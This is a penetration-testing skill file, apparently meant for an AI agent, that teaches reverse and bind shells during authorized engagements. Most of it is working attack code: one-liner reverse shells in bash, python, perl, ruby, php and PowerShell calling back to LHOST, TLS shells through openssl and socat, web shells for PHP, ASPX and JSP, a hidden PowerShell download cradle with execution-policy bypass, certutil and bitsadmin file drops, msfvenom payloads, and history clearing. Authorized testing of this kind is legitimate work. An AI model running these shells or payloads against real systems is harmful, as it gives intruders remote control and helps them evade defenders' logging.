---
name: reverse-shell-techniques
description: Reverse and bind shell establishment during authorized testing. Use after achieving command execution and needing an interactive session — language one-liners, encrypted shells via OpenSSL/socat/ncat, web shells, PTY stabilisation, file transfer onto the target, PowerShell cradles, egress-restricted alternatives, and cleanup of artefacts.
---

# SKILL: Reverse Shells

Turning command execution into an interactive session, during an authorized engagement.

## Scope and Authorization

This is post-exploitation. It applies only when you already have command execution on a system you are contracted to test, and it assumes:

- Written authorization naming the target host or range.
- Agreement that **interactive shell access** is in scope — command execution and a persistent shell are frequently scoped differently.
- An agreed listener host that the client knows about.
- A plan for **cleanup**: every file you write and every process you start is an artefact you own.

Log what you do as you go: timestamp, host, command, and what you left behind. That log is what makes the cleanup section of the report accurate, and it's what the blue team will ask for.

## Reverse or Bind?

| | Reverse | Bind |
|---|---|---|
| Egress filtered | Blocked | Unaffected |
| Ingress filtered | Unaffected | Blocked |
| Target behind NAT | Works | Fails |
| Detection profile | An outbound connection — quieter | A listening port — trivially spotted |
| **Default choice** | **Almost always this** | Only when there is no egress and you have inbound reach |

If both fail, you have an egress-restricted target — see *When Egress Is Filtered*.

Pick a port that blends in: 443, 80, or 53 outbound are commonly permitted where 4444 is not.

## Linux One-Liners

```bash
# bash /dev/tcp — no extra binaries needed
bash -c 'bash -i >& /dev/tcp/LHOST/443 0>&1'
bash -c 'exec 5<>/dev/tcp/LHOST/443; cat <&5 | while read l; do $l 2>&5 >&5; done'

# a fifo, when bash redirection is unavailable
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST 443 > /tmp/f; rm /tmp/f

# nc with -e (only some builds)
nc -e /bin/sh LHOST 443

# python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("LHOST",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# perl / ruby / php
perl -e 'use Socket;$i="LHOST";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("LHOST",443);loop{c.print "$ ";cmd=c.gets;IO.popen(cmd,"r"){|io|c.print io.read}}'
php -r '$s=fsockopen("LHOST",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

The Python one-liner spawns a PTY directly and saves you the stabilisation dance below — prefer it when Python is present.

Listener:

```bash
rlwrap nc -lvnp 443       # rlwrap gives you arrow keys and history immediately
```

## Encrypted Shells

Plaintext shells are trivially caught by IDS and readable by anyone on path. Encrypt where the engagement calls for realistic tradecraft — or simply where the traffic crosses untrusted networks.

```bash
# --- OpenSSL ---
# listener
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes -subj '/CN=x'
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
# target
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect LHOST:443 > /tmp/s; rm /tmp/s
```

```bash
# --- socat (gives a full PTY as well as encryption) ---
openssl req -newkey rsa:2048 -nodes -keyout s.key -x509 -days 30 -out s.crt -subj '/CN=x'
cat s.key s.crt > s.pem
socat OPENSSL-LISTEN:443,cert=s.pem,verify=0,fork -                        # listener
socat OPENSSL:LHOST:443,verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane   # target
```

```bash
# --- ncat ---
ncat --ssl -lvnp 443                    # listener
ncat --ssl LHOST 443 -e /bin/bash       # target
```

socat over TLS is the best single option when the binary is available on the target: encrypted *and* a proper PTY in one step.

## PTY Stabilisation

A raw `nc` shell has no job control, no tab completion, no arrow keys, and dies on Ctrl-C. Fix it:

```bash
# 1. on the target
python3 -c 'import pty;pty.spawn("/bin/bash")'
# 2. background it
^Z
# 3. on your machine
stty raw -echo; fg
# 4. back in the shell (press Enter twice first)
export TERM=xterm-256color
stty rows 50 cols 200          # match your real terminal: run `stty size` locally
```

Alternatives when Python is absent:

```bash
script -qc /bin/bash /dev/null
socat file:$(tty),raw,echo=0 tcp-listen:443     # listener side; full PTY, no upgrade needed
/usr/bin/expect -c 'spawn bash; interact'
perl -e 'exec "/bin/bash";'
```

Getting `stty rows/cols` right matters more than it sounds — a mismatched terminal size corrupts the display of any full-screen tool and makes `vi`, `less`, and pagers unusable.

## Web Shells

For a compromised web application, a web shell is often more stable than a callback — no egress needed, and it survives process restarts.

```php
<?php if (($_SERVER['HTTP_X_KEY'] ?? '') === 'ENGAGEMENT-TOKEN') { system($_REQUEST['c']); } ?>
```

```aspx
<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %>
<% if (Request.Headers["X-Key"] == "ENGAGEMENT-TOKEN") {
     var p = new ProcessStartInfo("cmd.exe", "/c " + Request["c"])
        { UseShellExecute = false, RedirectStandardOutput = true };
     Response.Write(Process.Start(p).StandardOutput.ReadToEnd()); } %>
```

```jsp
<%@ page import="java.io.*" %>
<% if ("ENGAGEMENT-TOKEN".equals(request.getHeader("X-Key"))) {
     Process p = Runtime.getRuntime().exec(request.getParameter("c"));
     BufferedReader b = new BufferedReader(new InputStreamReader(p.getInputStream()));
     String l; while ((l = b.readLine()) != null) out.println(l); } %>
```

**Always gate a web shell behind a secret.** An unauthenticated web shell on a live host is a genuine backdoor that anyone can find and use — you would be introducing a critical vulnerability, not testing for one. Record the path and the token, and remove it before the engagement ends.

Upgrade to a full shell once you have it:

```
GET /uploads/x.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/LHOST/443+0>%261'
```

## Windows

```powershell
# TCP reverse shell one-liner
$c=New-Object Net.Sockets.TCPClient('LHOST',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()

# download cradle
powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://LHOST/s.ps1')"

# encoded (note: UTF-16LE, not UTF-8)
$b=[Text.Encoding]::Unicode.GetBytes($cmd); powershell -ep bypass -enc ([Convert]::ToBase64String($b))
```

On modern Windows expect AMSI, Constrained Language Mode, and script block logging. A blocked payload is an EDR finding worth reporting, not a failure to work around silently — say what stopped you.

## File Transfer

```bash
# --- to Linux ---
wget http://LHOST:8000/f -O /tmp/f ; curl http://LHOST:8000/f -o /tmp/f
python3 -m http.server 8000                              # your side
nc -lvnp 9999 > f          # receiver;   nc LHOST 9999 < f      # sender
base64 -w0 f               # then paste and `base64 -d > f` — needs no network at all
scp -o ProxyJump=pivot user@target:/path/f ./
```

```powershell
# --- to Windows ---
(New-Object Net.WebClient).DownloadFile('http://LHOST/f','C:\Windows\Temp\f')
iwr http://LHOST/f -o C:\Windows\Temp\f
certutil -urlcache -f http://LHOST/f C:\Windows\Temp\f
bitsadmin /transfer j /download /priority high http://LHOST/f C:\Windows\Temp\f
# impacket-smbserver share /tmp/share -smb2support     (your side)
copy \\LHOST\share\f C:\Windows\Temp\f
```

Base64 copy-paste is the reliable fallback when there is no egress and no inbound — it moves files over the shell you already have.

## When Egress Is Filtered

| Situation | Approach |
|---|---|
| Only 80/443 out | Use those ports; a TLS shell on 443 looks like normal traffic |
| HTTP proxy required | Shell through the proxy (`socat` with `PROXY:`), or use a web shell instead |
| Only DNS out | DNS tunnelling (`dnscat2`, `iodine`) — slow but works |
| Only ICMP out | ICMP tunnel (`icmpsh`, `ptunnel`) |
| Nothing out, but inbound reachable | Bind shell |
| Nothing either way | Web shell over the existing application, or an out-of-band channel the app already uses |

Egress filtering that actually blocks you is worth reporting as a **working control**. Say so — clients rarely hear which of their defences held.

## msfvenom

```bash
msfvenom -p linux/x64/shell_reverse_tcp   LHOST=x LPORT=443 -f elf  -o s
msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=443 -f exe  -o s.exe
msfvenom -p php/reverse_php               LHOST=x LPORT=443 -f raw  -o s.php
msfvenom -p java/jsp_shell_reverse_tcp    LHOST=x LPORT=443 -f raw  -o s.jsp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x LPORT=443 -f exe -o m.exe
```

Staged (`/`) payloads need a matching handler and are smaller; stageless (`_`) are self-contained and survive flaky links. Both are heavily signatured — for a stealth-relevant engagement, prefer the hand-written one-liners above.

## Cleanup — part of the job

Before you close out, remove what you added and record what you couldn't:

```bash
history -c ; unset HISTFILE          # your shell history on the target
rm -f /tmp/f /tmp/s                  # fifos and dropped files
rm -f /var/www/html/uploads/x.php    # web shells — every one
```

Report explicitly:

- Every file written, with full path.
- Every web shell planted, with path and access token, and confirmation it was removed.
- Any process, cron entry, service, or account created.
- Anything you could **not** remove, and why — the client needs it in their remediation plan.
- Timestamps and source IPs, so the blue team can reconcile their alerts against your activity.

Never leave persistence in place after an engagement. If the client asks you to leave access for a retest, get it in writing and document it prominently.

Related skills: `file-access-vuln` (upload to RCE — where web shells usually come from), `injection-checking` (command injection as the initial execution), `api-sec` and `business-logic-vuln` (how you got there), `code-security` (the fix for the underlying flaw).
